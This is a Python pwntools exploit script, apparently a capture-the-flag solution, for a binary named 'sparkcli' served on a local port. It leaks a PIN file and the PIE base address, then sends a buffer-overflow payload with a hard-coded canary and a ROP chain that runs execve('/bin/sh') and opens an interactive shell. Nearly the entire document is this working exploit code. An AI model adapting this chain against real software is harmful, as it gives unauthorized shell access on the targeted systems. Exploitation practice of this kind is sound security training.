from pwn import *
context.update(arch='x86_64',os='linux')

# REQUIRED FILES:
# ./sparkcli + all the other .txt files (same dir)

binary = ELF('./sparkcli')
# p = process('./sparkcli', aslr=False)
p = remote("localhost", 7905)   # replace me with actual IP and port

# Exfiltrate PIN and Signature
p.recvuntil(b'$ ')
p.sendline(b'cat pin.txt')
PIN: bytes = p.recvuntil(b'$ ').replace(b'$ ', b'').rstrip()

print()
log.success(f"PIN: {PIN.decode()}")

p.sendline(b'log')
p.recvuntil(b'Logged Signature: ')
logged_sig: int = int(p.recvuntil(b'\n'), 16) - int(PIN.decode(), 10) - 0x165c

log.success(f'PIE Base: {hex(logged_sig)}')
p.sendline(b'exit')

# Generate Overflow Payload
offset: int = 88
canary: bytes = b'N\x02'

# Init ROP Chain Vals
# 1: other vals
shcode: bytes = b'/bin/sh\x00'
shcode_ptr: int = 0x40e0 + logged_sig

syscall: int = 0x202b + logged_sig      # syscall

# 2: end goal vals
RAX: int = 0x3b
RDI: int = shcode_ptr
RSI: int = 0
RDX: int = 0

# 3: gadgets
gadget1: int = 0x201a + logged_sig      # pop rax ; mov rbx, rdx ; ret
gadget2: int = 0x2026 + logged_sig      # pop rbx ; mov qword ptr [rbx], rax ; ret
gadget4: int = 0x2010 + logged_sig      # pop rdi ; mov rbx, rax ; mov rax, rcx ; ret
gadget5: int = 0x2018 + logged_sig      # pop rdx ; pop rcx ; pop rax ; mov rbx, rdx ; ret

sub_gad6: int = 0x2022 + logged_sig     # mov rsi, rbx ; ret

# ret_gadget: int = 0x0101a + logged_sig
shellprocess_addr = 0x17d4 + logged_sig

# Creating ROP Chain
rop = ROP(binary)
rop.raw(
    [
        gadget1, shcode,            # pop rax ; mov rbx, rdx ; ret
        gadget2, shcode_ptr,        # pop rbx ; mov qword ptr [rbx], rax ; ret
        gadget5, RSI, 0, 0,         # pop rdx ; pop rcx ; pop rax ; mov rbx, rdx ; ret
        sub_gad6,                   # mov rsi, rbx ; ret
        gadget4, RDI,               # pop rdi ; mov rbx, rax ; mov rax, rcx ; ret
        gadget5, RDX, 0, RAX,       # pop rdx ; pop rcx ; pop rax ; mov rbx, rdx ; ret
        syscall,                    # syscall ;
        shellprocess_addr           # shellprocess()
    ]
)

payload = fit({
    0: PIN,
    offset - len(canary) - 8: canary,
    offset: rop
}, filler=cyclic(256, n=8))

# Send entire payload
p.sendline(payload)
p.interactive()
